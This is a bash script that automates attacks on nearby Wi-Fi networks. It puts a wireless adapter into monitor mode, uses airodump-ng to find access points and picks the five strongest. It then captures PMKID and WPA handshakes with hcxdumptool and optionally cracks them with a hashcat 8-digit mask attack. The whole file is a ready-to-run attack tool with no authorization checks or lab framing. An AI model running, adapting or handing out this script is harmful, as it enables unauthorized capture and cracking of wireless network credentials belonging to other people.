#!/bin/bash

# Dependencies check
REQUIRED=("bettercap" "iw" "ip" "whiptail" "airodump-ng" "hcxdumptool" "hashcat")
MISSING=()

for dep in "${REQUIRED[@]}"; do
  if ! command -v "$dep" &> /dev/null; then
    MISSING+=("$dep")
  fi
done

if [ ${#MISSING[@]} -ne 0 ]; then
  echo "[ERROR] Missing dependencies: ${MISSING[*]}"
  echo "[INFO] Install the missing tools and rerun the script."
  exit 1
fi

# Step 1: Automatically detect wireless interface
INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)
if [ -z "$INTERFACE" ]; then
  echo "[ERROR] No wireless interface found. Make sure your adapter supports monitor mode."
  exit 1
fi

echo "[INFO] Wireless Interface Detected: $INTERFACE"

# Step 2: Switch to monitor mode
echo "[INFO] Switching $INTERFACE to monitor mode..."
ip link set "$INTERFACE" down
iw dev "$INTERFACE" set type monitor
ip link set "$INTERFACE" up

if [[ $(iwconfig "$INTERFACE" | grep -i "Mode:Monitor") ]]; then
  echo "[INFO] Monitor mode successfully enabled on $INTERFACE."
else
  echo "[ERROR] Failed to enable monitor mode on $INTERFACE."
  exit 1
fi

# Step 3: Run airodump-ng for discovery
echo "[INFO] Starting target discovery with airodump-ng..."
airodump-ng --write /tmp/airodump --output-format csv "$INTERFACE" &
PID=$!
sleep 10
kill "$PID"

# Step 4: Parse airodump results
echo "[INFO] Parsing discovered APs..."
AP_LIST=$(awk -F',' '$1 ~ /[0-9A-F]{2}(:[0-9A-F]{2}){5}/ && $4 != "" {print $1, $4, $9, $10}' /tmp/airodump-01.csv | sort -k4 -nr | head -n 5)

if [ -z "$AP_LIST" ]; then
  echo "[ERROR] No viable targets found. Try again in a different environment."
  exit 1
fi

echo "[INFO] Top Access Points:"
echo "$AP_LIST"

# Step 5: Automate PMKID and Handshake Capture
echo "[INFO] Starting PMKID and WPA handshake capture..."
hcxdumptool -i "$INTERFACE" --enable_status=1 --filterlist_ap=/tmp/airodump-01.csv --filtermode=2 --outfile=/tmp/capture.pcapng &
DUMP_PID=$!
sleep 60
kill "$DUMP_PID"

# Step 6: Run real-time cracking (optional)
if whiptail --yesno "Do you want to start real-time cracking on captured handshakes?" 10 60 --title "Real-Time Cracking"; then
  echo "[INFO] Starting Hashcat with basic mask attack..."
  hcxpcapngtool -o /tmp/hash.hc22000 /tmp/capture.pcapng
  hashcat -m 22000 -a 3 /tmp/hash.hc22000 ?d?d?d?d?d?d?d?d --force --status
fi

# Step 7: Restore managed mode
if whiptail --yesno "Restore $INTERFACE to managed mode?" 10 60 --title "Restore Managed Mode"; then
  ip link set "$INTERFACE" down
  iw dev "$INTERFACE" set type managed
  ip link set "$INTERFACE" up
  echo "[INFO] $INTERFACE restored to managed mode."
else
  echo "[INFO] $INTERFACE remains in monitor mode. Restore manually if needed."
fi

echo "[INFO] Operation complete. Check /tmp for captured files."
